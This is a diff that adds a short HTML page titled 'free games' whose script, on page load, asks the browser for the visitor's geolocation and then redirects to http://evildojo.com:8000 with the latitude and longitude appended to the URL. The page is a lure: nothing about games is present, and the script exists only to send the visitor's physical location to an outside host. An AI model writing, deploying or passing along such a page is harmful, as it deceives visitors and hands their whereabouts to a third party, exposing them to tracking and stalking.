@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>free games</title>
+</head>
+
+<body>
+<script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function showPosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            // You can store the latitude and longitude in variables or send them to a server for further processing
+            var coordinates = { latitude: latitude, longitude: longitude };
+            console.log("Coordinates:", coordinates);
+			var url = "http://evildojo.com:8000/?lat=" + latitude + "&lon=" + longitude;
+            // make a request to the server
+
+            // redirect to the server
+            window.location=url;
+            
+        }
+
+    getLocation();
+    </script>
+</body>
+
+
+</html>
+
